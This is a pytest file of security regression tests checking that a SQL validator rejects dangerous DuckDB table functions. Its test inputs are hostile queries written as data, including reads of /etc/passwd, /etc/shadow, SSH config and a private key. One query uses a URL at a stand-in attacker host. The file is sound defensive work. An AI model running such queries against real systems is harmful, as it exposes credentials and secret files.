"""Security regression tests: DuckDB table function blocklist.

Verifies that ``validate_sql_query()`` blocks dangerous DuckDB table
functions that could be used to read arbitrary files, list directories,
or access internal metadata — even inside otherwise-valid SELECT queries.

These tests guard against SSRF-via-SQL and arbitrary-file-read attacks
via the data ingestion pipeline.
"""

from __future__ import annotations

import pytest
from pycypher.ingestion.security import SecurityError, validate_sql_query


class TestDuckDBTableFunctionBlocklist:
    """DuckDB table functions must be rejected in user-supplied queries."""

    @pytest.mark.parametrize(
        "query",
        [
            "SELECT * FROM read_csv('/etc/passwd')",
            "SELECT * FROM read_csv_auto('/etc/shadow')",
            "SELECT * FROM read_parquet('/tmp/secrets.parquet')",
            "SELECT * FROM read_json('/home/user/.ssh/config')",
            "SELECT * FROM read_json_auto('/var/log/syslog.json')",
            "SELECT * FROM read_blob('/etc/ssl/private/key.pem')",
            "SELECT * FROM read_text('/etc/hostname')",
            "SELECT * FROM glob('/home/*/.ssh/*')",
            "SELECT * FROM parquet_scan('/data/file.parquet')",
            "SELECT * FROM parquet_metadata('/data/file.parquet')",
            "SELECT * FROM parquet_schema('/data/file.parquet')",
            "SELECT * FROM sniff_csv('/data/file.csv')",
        ],
        ids=[
            "read_csv",
            "read_csv_auto",
            "read_parquet",
            "read_json",
            "read_json_auto",
            "read_blob",
            "read_text",
            "glob",
            "parquet_scan",
            "parquet_metadata",
            "parquet_schema",
            "sniff_csv",
        ],
    )
    def test_blocks_file_read_functions(self, query: str) -> None:
        """Table functions that read files must be rejected."""
        with pytest.raises(
            SecurityError, match="Dangerous DuckDB table function"
        ):
            validate_sql_query(query)

    @pytest.mark.parametrize(
        "query",
        [
            "SELECT * FROM duckdb_functions()",
            "SELECT * FROM duckdb_tables()",
            "SELECT * FROM duckdb_columns()",
            "SELECT * FROM duckdb_settings()",
            "SELECT * FROM duckdb_extensions()",
        ],
        ids=[
            "duckdb_functions",
            "duckdb_tables",
            "duckdb_columns",
            "duckdb_settings",
            "duckdb_extensions",
        ],
    )
    def test_blocks_duckdb_metadata_functions(self, query: str) -> None:
        """DuckDB internal metadata functions must be rejected."""
        with pytest.raises(SecurityError, match="Dangerous DuckDB function"):
            validate_sql_query(query)

    @pytest.mark.parametrize(
        "query",
        [
            "SELECT * FROM pg_settings()",
            "SELECT * FROM pg_am()",
            "SELECT * FROM pragma_table_info('source')",
            "SELECT * FROM pragma_database_list()",
        ],
        ids=[
            "pg_settings",
            "pg_am",
            "pragma_table_info",
            "pragma_database_list",
        ],
    )
    def test_blocks_system_catalog_functions(self, query: str) -> None:
        """System catalog and pragma functions must be rejected."""
        with pytest.raises(SecurityError, match="Dangerous DuckDB function"):
            validate_sql_query(query)

    @pytest.mark.parametrize(
        "query",
        [
            "SELECT * FROM source",
            "SELECT col1, col2 FROM source WHERE col1 > 10",
            "SELECT count(*) FROM source GROUP BY category",
            "WITH cte AS (SELECT * FROM source) SELECT * FROM cte",
            "SELECT a.*, b.* FROM source a JOIN source b ON a.id = b.id",
        ],
        ids=[
            "simple_select",
            "filtered_select",
            "aggregated_select",
            "cte_select",
            "self_join",
        ],
    )
    def test_allows_safe_queries(self, query: str) -> None:
        """Legitimate queries referencing only the 'source' view must pass."""
        validate_sql_query(query)  # Should not raise

    def test_blocks_case_variations(self) -> None:
        """Function name matching must be case-insensitive."""
        with pytest.raises(
            SecurityError, match="Dangerous DuckDB table function"
        ):
            validate_sql_query("SELECT * FROM READ_CSV('/etc/passwd')")

    def test_blocks_whitespace_before_paren(self) -> None:
        """Whitespace between function name and opening paren must not bypass."""
        with pytest.raises(
            SecurityError, match="Dangerous DuckDB table function"
        ):
            validate_sql_query("SELECT * FROM read_csv  ('/etc/passwd')")

    def test_blocks_in_subquery(self) -> None:
        """Table functions in subqueries must also be blocked."""
        with pytest.raises(
            SecurityError, match="Dangerous DuckDB table function"
        ):
            validate_sql_query(
                "SELECT * FROM source WHERE id IN "
                "(SELECT id FROM read_csv('/etc/passwd'))"
            )

    def test_blocks_in_cte(self) -> None:
        """Table functions inside CTEs must also be blocked."""
        with pytest.raises(
            SecurityError, match="Dangerous DuckDB table function"
        ):
            validate_sql_query(
                "WITH stolen AS (SELECT * FROM read_csv('/etc/passwd')) "
                "SELECT * FROM stolen"
            )

    def test_blocks_data_exfiltration_via_url(self) -> None:
        """Table functions with URLs for data exfiltration must be blocked."""
        with pytest.raises(
            SecurityError, match="Dangerous DuckDB table function"
        ):
            validate_sql_query(
                "SELECT * FROM read_csv('https://attacker.com/exfil')"
            )


class TestBFSFrontierLimit:
    """Verify the BFS frontier size limit constant is reasonable."""

    def test_frontier_limit_constant_exists(self) -> None:
        """The frontier limit constant must be importable and positive."""
        from pycypher.path_expander import _MAX_FRONTIER_ROWS

        assert _MAX_FRONTIER_ROWS > 0
        assert _MAX_FRONTIER_ROWS <= 10_000_000  # Sanity: not absurdly large
